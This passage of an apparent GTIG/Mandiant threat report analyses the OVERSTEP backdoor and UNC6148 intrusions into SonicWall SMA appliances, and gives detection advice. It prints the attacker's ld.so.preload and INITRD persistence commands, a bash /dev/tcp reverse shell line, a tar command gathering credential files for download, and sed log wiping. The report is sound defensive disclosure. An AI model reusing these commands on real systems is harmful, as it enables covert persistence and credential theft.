style=\"vertical-align: baseline;\">dfir.ch reported this vulnerability being used to exploit SonicWall SMAs in an intrusion that led to the deployment of Abyss-branded ransomware in March 2024, with similar intrusion artifacts to Mandiant's investigation.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CVE-2025-32819: Authenticated file deletion vulnerability (</span><a href=\"https://psirt.global.sonicwall.com/vuln-detail/snwlid-2025-0011\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SonicWall advisory</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.rapid7.com/blog/post/2025/05/07/multiple-vulnerabilities-in-sonicwall-sma-100-series-2025/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Rapid7 report</span></a><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Using a crafted HTTP request, this vulnerability can be exploited to cause a targeted SonicWall SMA to revert the built-in administrator credentials to </span><code style=\"vertical-align: baseline;\">password</code><span style=\"vertical-align: baseline;\">, granting the attacker administrator access.</span></p>\n</li>\n</ul>\n</ul>\n<p><span style=\"vertical-align: baseline;\">There are several different paths UNC6148 could have taken with the aforementioned vulnerabilities, or possibly a different vulnerability not mentioned here. CVE-2024-38475 would have provided local administrator credentials and valid session tokens that UNC6148 could reuse, making it an attractive target, but Mandiant was not able to confirm abuse of that vulnerability. Exploitation of the previously mentioned authenticated bugs would require UNC6148 to already have some level of credentials to the SMA appliance, making them less likely to have been abused, but still worth mentioning due to their in-the-wild exploited status. It is also possible that credentials could have been obtained through infostealer logs or credential marketplaces, but GTIG was unable to identify any direct credential exposure related to the abused SMA appliance credentials.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Subsequent SMA Compromise and OVERSTEP Deployment</span></h2>\n<p><span style=\"vertical-align: baseline;\">Mandiant's aforementioned investigation showed that in June 2025, UNC6148 established a Secure Sockets Layer virtual private network (SSL VPN) session on the targeted SMA 100 series appliance using the mentioned local administrator credentials from a BitLaunch (BLNWX) VPS (193.149.180.50). </span></p>\n<p><span style=\"vertical-align: baseline;\">Once the SSL VPN session was established, the attacker spawned a reverse shell on the targeted SMA appliance. Shell access should not be possible by design on these appliances, and Mandiant's joint investigation with the SonicWall Product Security Incident Response Team (PSIRT) did not identify how UNC6148 established this reverse shell. It's possible the reverse shell was established via exploitation of an unknown vulnerability by UNC6148.</span></p>\n<p><span style=\"vertical-align: baseline;\">Through the reverse shell, UNC6148 performed initial reconnaissance and file manipulation using a variety of built-in system binaries such as </span><code style=\"vertical-align: baseline;\">cat</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">chmod</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">date</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">hostname</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">mkdir</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">mount</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">mv</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">rm</code><span style=\"vertical-align: baseline;\">. Mandiant also observed the actor export and import settings to the SMA appliance, along with new network access control policy rules created for IP addresses used by UNC6148, suggesting they may have modified an exported settings file offline to include new rules for their infrastructure to ensure uninterrupted operations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Following this initial activity, the attacker deployed the OVERSTEP backdoor. This process involved executing a series of commands to decode the binary from Base64 into the persistent </span><code style=\"vertical-align: baseline;\">/cf</code><span style=\"vertical-align: baseline;\"> directory with the filename </span><code style=\"vertical-align: baseline;\">xxx.elf</code><span style=\"vertical-align: baseline;\">, moving it to </span><code style=\"vertical-align: baseline;\">/usr/lib/libsamba-errors.so.6</code><span style=\"vertical-align: baseline;\">, and ensuring persistence by adding its path to </span><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>cd /cf; touch xxx.elf;\nopenssl enc -base64 -d [REDACTED] &gt;&gt;xxx.elf;\nchmod 777 /usr/lib/libsamba-errors.so.6;\ntouch -c /usr/lib/libsamba-errors.so.6 -r \necho /usr/lib/libsamba-errors.so.6 &gt; /etc/ld.so.preload;\nchown root:root /usr/lib/libsamba-errors.so.6;\nchmod 777 /usr/lib/libsamba-errors.so.6;\ntouch -c /usr/lib/libsamba-errors.so.6 -r \necho /usr/lib/libsamba-errors.so.6 &gt; /etc/ld.so.preload;\narp</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 1: Selection of attacker shell commands executed on the appliance</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Next, UNC6148 modified the legitimate RC file </span><code style=\"vertical-align: baseline;\">/etc/rc.d/rc.fwboot</code><span style=\"vertical-align: baseline;\"> to achieve persistence for OVERSTEP. The changes meant that whenever the appliance was rebooted, the OVERSTEP binary would be loaded into the running filesystem on the appliance. Specifically, the </span><code style=\"vertical-align: baseline;\">bootCurrentFirmware</code><span style=\"vertical-align: baseline;\"> function in the </span><code style=\"vertical-align: baseline;\">rc.fwboot</code><span style=\"vertical-align: baseline;\"> script was modified to include code that performed the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Created a temporary directory named </span><code style=\"vertical-align: baseline;\">zzz</code><span style=\"vertical-align: baseline;\"> within the present firmware directory. This directory served as a staging area to unpack, modify, and repack the <code>INITRD</code> image. It was a preparatory step for injecting malicious content without directly overwriting critical system files during runtime.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Decompressed the </span><code style=\"vertical-align: baseline;\">INITRD.GZ</code><span style=\"vertical-align: baseline;\"> file, which was the compressed initial RAM disk image. The decompressed file was named </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\">, which contains the minimal root filesystem that is loaded into memory during the boot process before the actual root filesystem is mounted. Modifying this image allowed the attacker to inject malicious files that will be present and executable early in the boot sequence, making it difficult to detect and remove.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Mounted the decompressed </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> file as a loop device to the newly created </span><code style=\"vertical-align: baseline;\">$fwLoc/zzz</code><span style=\"vertical-align: baseline;\"> directory. This made the contents of the </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> file accessible and modifiable as if it were a regular filesystem. This was an important step that allowed the script to browse and modify the contents of the initial RAM disk.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Copied the file </span><code style=\"vertical-align: baseline;\">libsamba-errors.so.6</code><span style=\"vertical-align: baseline;\"> from </span><code style=\"vertical-align: baseline;\">/cf/</code><span style=\"vertical-align: baseline;\"> into the mounted </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> directory </span><code style=\"vertical-align: baseline;\">/usr/lib/</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Changed the owner and group of the file </span><code style=\"vertical-align: baseline;\">libsamba-errors.so.6</code><span style=\"vertical-align: baseline;\"> to </span><code style=\"vertical-align: baseline;\">root:root</code><span style=\"vertical-align: baseline;\">. This sets the permissions to mimic legitimate system libraries, which are typically owned by </span><code style=\"vertical-align: baseline;\">root</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Changed the file permissions of the copied malicious library to 0777 (read, write, and execute for owner, group, and others).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Employed a timestomping technique, attempting to copy the modification timestamp from the legitimate file </span><code style=\"vertical-align: baseline;\">libsamba-errors.so</code><span style=\"vertical-align: baseline;\"> to the malicious file </span><code style=\"vertical-align: baseline;\">libsamba-errors.so.6</code><span style=\"vertical-align: baseline;\">. The goal was to make the malicious file appear as if it were part of the original system installation, thereby hindering detection and investigation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Wrote the path to the malicious file </span><code style=\"vertical-align: baseline;\">/usr/lib/libsamba-errors.so.6</code><span style=\"vertical-align: baseline;\"> into the </span><code style=\"vertical-align: baseline;\">ld.so.preload</code><span style=\"vertical-align: baseline;\"> file located within the <code>INITRD</code> directory </span><code style=\"vertical-align: baseline;\">/etc/</code><span style=\"vertical-align: baseline;\">. This causes dynamic executables to load the OVERSTEP shared object file, providing persistence and privileged execution in system processes.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Cleaned up temporary modifications, including:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Flushing pending disk writes to ensure all changes to the </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> file were saved</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Unmounting the </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> file from the temporary directory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Recompressing the modified </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> file</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Removing the temporary directory</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Renamed the newly compressed </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> to </span><code style=\"vertical-align: baseline;\">INITRD.GZ</code><span style=\"vertical-align: baseline;\">, matching the expected filename.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Changed the timestamps of the modified </span><code style=\"vertical-align: baseline;\">INITRD.GZ</code><span style=\"vertical-align: baseline;\"> file to match those of the kernel image file, </span><code style=\"vertical-align: baseline;\">BZIMAGE</code><span style=\"vertical-align: baseline;\">. This was another timestomping operation to hinder detection and investigation. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Loaded the kernel image </span><code style=\"vertical-align: baseline;\">BZIMAGE</code><span style=\"vertical-align: baseline;\"> and the modified initial RAM disk, </span><code style=\"vertical-align: baseline;\">INITRD.GZ</code><span style=\"vertical-align: baseline;\">, into memory for a new kernel execution. It also appended kernel boot options from </span><code style=\"vertical-align: baseline;\">LINUX.OPT</code><span style=\"vertical-align: baseline;\">. This prepared the system to boot into the modified firmware. The use of </span><code style=\"vertical-align: baseline;\">kexec</code><span style=\"vertical-align: baseline;\"> allowed the running Linux kernel to boot another Linux kernel without a full hardware reboot.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Executed the newly loaded kernel by initiating a soft reboot.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In summary, the code took advantage of the system's boot process to inject a persistent rootkit. By modifying the </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> file and leveraging </span><code style=\"vertical-align: baseline;\">ld.so.preload</code><span style=\"vertical-align: baseline;\">, the attacker ensured their malicious code would be loaded and executed every time any dynamic executable starts, providing them with privileged and persistence control of the appliance.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>function bootCurrentFirmware()\n{\n\techo \"$FUNCNAME: begin\" &gt;&gt; $LOGFILE\n\tfwLoc=/cf/firmware/current\n   \n\tif [ ! -f $fwLoc/BZIMAGE ]; then\n        \techo \"Can't locate the kernel image\" &gt;&gt; $LOGFILE;\n\telif [ -f $fwLoc/INITRD ]; then\n        \techo \"Can't locate the filesystem image\" &gt;&gt; $LOGFILE;\n\telse\n    \tmkdir $fwLoc/zzz\n    \tgzip -d $fwLoc/INITRD.GZ\n    \tmount -o loop $fwLoc/INITRD $fwLoc/zzz\n \n    \tcp /cf/libsamba-errors.so.6  \n$fwLoc/zzz/usr/lib/libsamba-errors.so.6\n    \tchown root:root $fwLoc/zzz/usr/lib/libsamba-errors.so.6\n    \tchmod 777 $fwLoc/zzz/usr/lib/libsamba-errors.so.6\n    \ttouch -c $fwLoc/zzz/usr/lib/libsamba-errors.so.6 -r \n$fwLoc/zzz/usr/lib/libsamba-errors.so\n    \techo /usr/lib/libsamba-errors.so.6  &gt; $fwLoc/zzz/etc/ld.so.preload\n \n    \tsync; umount $fwLoc/zzz; sync; gzip $fwLoc/INITRD; rm -rf $fwLoc/zzz\n    \tmv $fwLoc/INITRD.gz $fwLoc/INITRD.GZ; touch -c $fwLoc/INITRD.GZ -r \n$fwLoc/BZIMAGE\n \n    \t/usr/local/sbin/kexec -l $fwLoc/BZIMAGE --initrd=$fwLoc/INITRD.GZ  \n--append=\"`cat $fwLoc/LINUX.OPT`\"\n    \t/usr/local/sbin/kexec -e;\n\tfi\n \n\techo \"$FUNCNAME: end\" &gt;&gt; $LOGFILE\n}</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 2: Modified function in the rc.fwboot file to provide persistence for OVERSTEP</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Once the deployment of OVERSTEP was complete, the threat actor cleared the system logs and rebooted the appliance to trigger the execution of OVERSTEP.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Analysis of OVERSTEP</span></h2>\n<p><span style=\"vertical-align: baseline;\">OVERSTEP is a backdoor written in C, designed for SonicWall SMA 100 series appliances; observed samples have been compiled as a 32-bit ELF shared object for the Intel x86 architecture. This shared object is designed to be loaded into processes via the </span><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code><span style=\"vertical-align: baseline;\"> file. When preloaded in this manner, the malicious library is mapped into the address space of subsequently launched processes. This preloading enables the malware to hijack standard library functions—specifically </span><code style=\"vertical-align: baseline;\">open</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">open64</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">readdir</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">readdir64</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\">—by ensuring these symbols are resolved from the malicious shared object before the legitimate system libraries. The backdoor's primary functionalities are to establish a reverse shell and exfiltrate passwords from the compromised host. Additionally, the malware implements usermode rootkit capabilities by leveraging its hooked file system-related functions (</span><code style=\"vertical-align: baseline;\">open</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">open64</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">readdir</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">readdir64</code><span style=\"vertical-align: baseline;\">) to effectively hide its components on the host. Communications with the command-and-control (C2 or C&amp;C) server are indirect, relying on parsing commands from buffers intercepted by the malicious </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\"> API.</span></p>\n<p><span style=\"vertical-align: baseline;\">The path to the malicious shared object was added to the </span><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code><span style=\"vertical-align: baseline;\"> file, which effectively ensures the malware will persist on the compromised appliance. Due to its inclusion in the </span><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code><span style=\"vertical-align: baseline;\"> file, the malware's shared object is mapped into every new process executed on the compromised system. Upon being mapped, the malware gains execution through its initialization routine, specifically via its exported </span><code style=\"vertical-align: baseline;\">my_init</code><span style=\"vertical-align: baseline;\"> function. This </span><code style=\"vertical-align: baseline;\">my_init</code><span style=\"vertical-align: baseline;\"> function then sets the </span><code style=\"vertical-align: baseline;\">FS_IMMUTABLE_FL</code><span style=\"vertical-align: baseline;\"> flag on </span><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code><span style=\"vertical-align: baseline;\">, effectively preventing its modification, deletion, renaming, or the creation of links to it. This preloading mechanism enables the malware to perform </span><code style=\"vertical-align: baseline;\">LD_PRELOAD</code><span style=\"vertical-align: baseline;\"> hijacking, interposing its own versions of the following standard library functions: </span><code style=\"vertical-align: baseline;\">open</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">open64</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">readdir</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">readdir64</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\">. The hijacked </span><code style=\"vertical-align: baseline;\">open*</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">readdir</code><span style=\"vertical-align: baseline;\">* APIs are leveraged to implement a usermode rootkit, concealing the malware's presence and components. The core backdoor functionality, conversely, is implemented within the hooked </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\"> function. The rootkit and backdoor functionalities are described in greater detail in the subsequent sections.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Usermode Rootkit</span></h3>\n<p><span style=\"vertical-align: baseline;\">The hijacked </span><code style=\"vertical-align: baseline;\">open</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">open64</code><span style=\"vertical-align: baseline;\"> API functions, which typically specify a file path and access mode, are manipulated by the malware. The malware's implementation of these functions checks if the requested file path is </span><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code><span style=\"vertical-align: baseline;\">. If a match occurs, it returns an error code, thereby preventing any process on the compromised system from opening this critical file.</span></p>\n<p><span style=\"vertical-align: baseline;\">The hijacked </span><code style=\"vertical-align: baseline;\">readdir</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">readdir64</code><span style=\"vertical-align: baseline;\"> API functions are used to conceal the following artifacts from directory listings:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">/proc</code><span style=\"vertical-align: baseline;\"> entries related to </span><code style=\"vertical-align: baseline;\">bash</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">sh</code><span style=\"vertical-align: baseline;\">, or </span><code style=\"vertical-align: baseline;\">ssh</code><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">libsamba-errors.so.6</code><span style=\"vertical-align: baseline;\"> (the filename of the malware observed on this particular system) </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Backdoor</span></h3>\n<p><span style=\"vertical-align: baseline;\">The backdoor's command execution mechanism is centered on its hijacked </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\"> API function. The standard </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\"> API receives a buffer containing data destined for an I/O stream. In this implementation, the malicious write function examines the first 1024 bytes of this buffer, searching for the command strings </span><code style=\"vertical-align: baseline;\">dobackshell</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">dopasswords</code><span style=\"vertical-align: baseline;\">. If either string is detected, the malware expects to find associated command parameters immediately following it.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">dobackshell</code></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Starts a reverse shell using the command </span><code style=\"vertical-align: baseline;\">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1 &amp;</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Parameters: IP address and port.</span></p>\n</li>\n</ul>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">dopasswords</code></p>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Creates a TAR archive with the provided &lt;filename&gt;, bundling sensitive files using the command in Figure 3. Notably, the TAR archive is saved in the web-accessible directory </span><code style=\"vertical-align: baseline;\">/usr/src/EasyAccess/www/htdocs</code><span style=\"vertical-align: baseline;\"> with permissive </span><code style=\"vertical-align: baseline;\">777</code><span style=\"vertical-align: baseline;\"> permissions. This allows an attacker to download the archive via a web browser.</span></li>\n<li><span style=\"vertical-align: baseline;\">Parameters: Filename of the TAR archive.</span></li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>tar czfP /usr/src/EasyAccess/www/htdocs/&lt;filename&gt;.tgz \n/tmp/temp.db /etc/EasyAccess/var/conf/persist.db \n/etc/EasyAccess/var/cert; chmod 777 \n/usr/src/EasyAccess/www/htdocs/&lt;filename&gt;.tgz</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 3: Shell commands executed by the <code>dopasswords</code> OVERSTEP command</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Following the parsing and execution of a command, the malware attempts to remove corresponding entries from affected log files. This cleanup is performed using the </span><code style=\"vertical-align: baseline;\">sed</code><span style=\"vertical-align: baseline;\"> command: </span><code style=\"vertical-align: baseline;\">sed -i '/&lt;cmd&gt;/d' /var/log/&lt;log_file&gt;</code><span style=\"vertical-align: baseline;\">, where </span><code style=\"vertical-align: baseline;\">&lt;cmd&gt;</code><span style=\"vertical-align: baseline;\"> is either </span><code style=\"vertical-align: baseline;\">dobackshell</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">dopasswords</code><span style=\"vertical-align: baseline;\">. The targeted </span><code style=\"vertical-align: baseline;\">&lt;log_file&gt;</code><span style=\"vertical-align: baseline;\"> can be </span><code style=\"vertical-align: baseline;\">httpd.log</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">http_request.log</code><span style=\"vertical-align: baseline;\">, or </span><code style=\"vertical-align: baseline;\">inotify.log</code><span style=\"vertical-align: baseline;\">. This log cleaning process is only initiated if the malware can successfully elevate its privileges by setting its UID and GID to </span><code style=\"vertical-align: baseline;\">0</code><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Receiving Commands</span></h3>\n<p><span style=\"vertical-align: baseline;\">The malware was designed to receive commands embedded within web requests. For instance, a legitimate </span><code style=\"vertical-align: baseline;\">httpd</code><span style=\"vertical-align: baseline;\"> server might receive a URL (e.g., </span><code style=\"vertical-align: baseline;\">https://&lt;compromised_server&gt;/query?q=dobackshell&lt;params&gt;</code><span style=\"vertical-align: baseline;\">) containing the command and its parameters. The server would then attempt to log this request to files such as </span><code style=\"vertical-align: baseline;\">httpd.log</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">http_request.log</code><span style=\"vertical-align: baseline;\">, or </span><code style=\"vertical-align: baseline;\">inotify.log</code><span style=\"vertical-align: baseline;\">. At this juncture, because the malicious shared object is preloaded into the </span><code style=\"vertical-align: baseline;\">httpd</code><span style=\"vertical-align: baseline;\"> process's address space, the call to </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\"> is intercepted. The malicious </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\"> function then parses the log data and dispatches any recognized command. While, technically, </span><code style=\"vertical-align: baseline;\">write</code><span style=\"vertical-align: baseline;\"> operations from any process could be used to deliver commands, this web server log vector is likely the intended and most practical method from an attacker's perspective.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Risk and Post-Compromise Activities</span></h2>\n<p><span style=\"vertical-align: baseline;\">In our investigations, GTIG observed beaconing traffic from compromised appliances, but we did not identify notable post-compromise activities. The actor's success in hiding their tracks is largely due to OVERSTEP's capability to selectively delete log entries from </span><code style=\"vertical-align: baseline;\">httpd.log</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">http_request.log</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">inotify.log</code><span style=\"vertical-align: baseline;\">. This anti-forensic measure, combined with a lack of shell history on disk, significantly reduces visibility into the actor's secondary objectives.</span></p>\n<p><span style=\"vertical-align: baseline;\">The primary risk stems from OVERSTEP's functionality to steal sensitive files. Its ability to exfiltrate the </span><code style=\"vertical-align: baseline;\">persist.db</code><span style=\"vertical-align: baseline;\"> database and certificate files from the </span><code style=\"vertical-align: baseline;\">/etc/EasyAccess/var/cert</code><span style=\"vertical-align: baseline;\"> directory gives the attacker credentials, OTP seeds, and certificates. While we did not directly observe the weaponization of this stolen data, it creates a clear path for persistent access.</span></p>\n<p><span style=\"vertical-align: baseline;\">Impacted organizations should rotate all secrets stored on the appliances and follow the recommendations in this article.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Wider Context and Campaigns</span></h2>\n<p><span style=\"vertical-align: baseline;\">This campaign extends beyond the incidents GTIG directly investigated. We have identified targeting of other SonicWall SMA appliances by UNC6148, including possible scanning activity dating back to at least October 2024. Our findings are also supported by SonicWall, which has confirmed reports of other impacted organizations and subsequently updated its </span><a href=\"https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0018\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">advisory</span></a><span style=\"vertical-align: baseline;\"> for CVE-2024-38475 to recommend OTP seed rotation.</span></p>\n<p><span style=\"vertical-align: baseline;\">While GTIG has not directly observed monetization or other end-stage goals associated with this campaign, analysis of historical network telemetry data revealed traffic involving an SMA 100 series appliance in May 2025 affiliated with an organization that later appeared on the \"World Leaks\" DLS in June 2025; however, we cannot rule out coincidental overlap at this time.</span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, UNC6148 activity has noteworthy overlaps with historical analysis from </span><a href=\"https://www.truesec.com/hub/blog/web-shell-on-a-sonicwall-sma\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Truesec</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://dfir.ch/posts/microsocks_sonicwall/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">dfir.ch</span></a><span style=\"vertical-align: baseline;\">, which involved the deployment of Abyss-branded ransomware. These overlaps, which suggest that UNC6148 is the same actor or a related one, further indicate that these intrusions could ultimately lead to data extortion and ransomware deployment.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The OVERSTEP backdoor and deployment mechanism observed by Mandiant appears to be a direct evolution of the </span><code style=\"vertical-align: baseline;\">wafxSummary</code><span style=\"vertical-align: baseline;\"> tool reported by Truesec in late 2023.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A dfir.ch blog post from early 2024 describes an intrusion where nearly a year went by between the deployment of the </span><code style=\"vertical-align: baseline;\">wafxSummary</code><span style=\"vertical-align: baseline;\"> tool Truesec wrote about, and the deployment of Abyss-branded ransomware. This is consistent with the 6-month+ time gap between initial UNC6148 activity and the deployment of OVERSTEP in our recent investigation.</span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Recommendations</span></h2>\n<p><span style=\"vertical-align: baseline;\">GTIG recommends that all organizations with SMA appliances perform analysis to determine if they have been compromised. Organizations should acquire disk images for forensic analysis to avoid interference from the rootkit anti-forensic capabilities. Organizations may need to engage with SonicWall to capture disk images from physical appliances.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Hunting and Detection</span></h3>\n<p><span style=\"vertical-align: baseline;\">Defenders should analyze disk images and peripheral log sources for the following signs of compromise:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<h4><span style=\"vertical-align: baseline;\">File System Artifacts</span></h4>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Presence of any indicators of compromise (IOCs) listed in this report.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Unexpected binaries within the persistent </span><code style=\"vertical-align: baseline;\">/cf</code><span style=\"vertical-align: baseline;\"> directory or within </span><code style=\"vertical-align: baseline;\">INITRD</code><span style=\"vertical-align: baseline;\"> files, especially in the </span><code style=\"vertical-align: baseline;\">/usr/lib</code><span style=\"vertical-align: baseline;\"> directory. In our investigations, GTIG observed OVERSTEP residing in these directories.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Presence of the file </span><code style=\"vertical-align: baseline;\">/etc/ld.so.preload</code><span style=\"vertical-align: baseline;\"> 